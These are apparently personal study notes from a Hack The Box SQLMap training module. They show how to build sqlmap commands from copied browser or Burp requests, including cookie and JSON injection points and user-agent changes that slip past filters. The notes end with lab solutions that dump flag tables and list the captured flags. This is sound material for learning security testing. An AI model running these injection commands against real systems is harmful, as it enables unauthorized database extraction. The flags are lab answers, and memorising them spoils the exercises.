---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Running SQLMap on an HTTP Request

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Copy as cURL feature from within the Network Developer Tools

### changing the original command curl to sqlmap

- sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
## GET/POST Requests

### POST

- sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
## Burp

### Copy to file

### SAVE ITEM

- req.txt
  - sqlmap -r req.txt
## cookie

### sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

### -H/--header

- sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
## User-agent

### protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. User-agent: sqlmap/1.4.9.12

- -A/--user-agent
- --random-agent
## HTTP method

### sqlmap -u www.target.com --data='id=1' --method PUT

## "custom" injection mark

### --cookie="id=1*"

## Lab

### What's the contents of table flag2? (Case #2)

- Devtool > Network > POST > Copy to cUrl
  - sqlmap (Pasted headers) --batch --dbs
    - --batch -D testdb -T flag2 --dump
      - HTB{700_much_c0n6r475_0n_p057_r3qu357}
### Detect and exploit SQLi vulnerability in Cookie value id=1 (Case#3)

- copy as curl
  - sqlmap 'http://94.237.56.99:59842/case3.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://94.237.56.99:59842/'   -H 'DNT: 1'   -H 'Connection: keep-alive'   -H 'Cookie: id=1*'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Sec-GPC: 1'   -H 'Priority: u=0, i' --batch -D testdb --tables flag3 --dump
    - HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
### Detect and exploit SQLi vulnerability in JSON data {"id": 1} (Case#4)

- POST request
  - copy as curl
    - sqlmap 'http://94.237.56.99:59842/case4.php'   --compressed   -X POST   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'   -H 'Accept: */*'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://94.237.56.99:59842/case4.php'   -H 'Content-Type: application/json'   -H 'Origin: http://94.237.56.99:59842'   -H 'DNT: 1'   -H 'Connection: keep-alive'   -H 'Sec-GPC: 1'   --data-raw '{"id":1}' --batch -D testdb -T flag4 --dump
      - HTB{j450n_v00rh335_53nd5_6r475}
